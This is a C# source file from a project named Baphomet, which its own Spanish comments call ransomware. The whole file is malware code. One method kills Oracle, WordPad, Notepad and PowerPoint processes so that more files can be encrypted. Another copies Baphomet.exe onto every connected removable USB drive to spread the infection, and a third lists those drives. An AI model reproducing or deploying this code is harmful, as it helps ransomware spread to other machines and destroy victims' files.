using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Management;
using Baphomet.Models;
using System.Linq;

namespace Baphomet.Utilities
{
    //En esta Clase estan los metodos encargados de verificar el sistema.(Processos, antivirus, Parches de seguridad, etc)
    public class Diagnostics
    {
        //Aqui coloco los procesos que deseo detener para poder cifrar la mayor cantidad de archivos posibles.
        public void CheckProccess()
        {
            var validProccess = new []
            {
                "oracle",
                "wordpad",
                "notepad",
                "powerpnt"
            };

            foreach (var proccessName in validProccess)
            {
                Process[] proc = Process.GetProcessesByName(proccessName);
                if (proc.Length > 0)
                {
                    foreach(var process in proc)
                    {
                        process.Kill();
                    }
                }
            }
        }

        //Metodo para copiar el .exe en las unidades usb
        //Este metodo lo utilizo para propagar el ransomware en los dispositivos de almacenamiento.
        public void AutoCopy(List<UsbDeviceDTO> usbDevice)
        {
            var source = Directory.GetCurrentDirectory();
            var sourceFile = source + "\\Baphomet.exe";

            byte[] fileArray = File.ReadAllBytes(sourceFile);
            long baphometSize = fileArray.Length;

            try
            {
                foreach (var device in usbDevice)
                {
                    if(device.FreeSpace > baphometSize)
                    {
                        var destFile = device.Name + "Baphomet.exe";
                        File.Copy(sourceFile, destFile);
                    }
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
        }

        //Metodo para obtener lista de dispositivos usb conectados en la maquina.
        public List<UsbDeviceDTO> GetUsbDevices()
        {
            List<UsbDeviceDTO> device = new List<UsbDeviceDTO>();

            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady == true && d.DriveType == DriveType.Removable)
                {
                    device.Add(new UsbDeviceDTO()
                    {
                        Name = d.Name,
                        FreeSpace = d.TotalFreeSpace,
                        Format = d.DriveFormat
                    });
                }
            }
            return device;
        }

    }
}
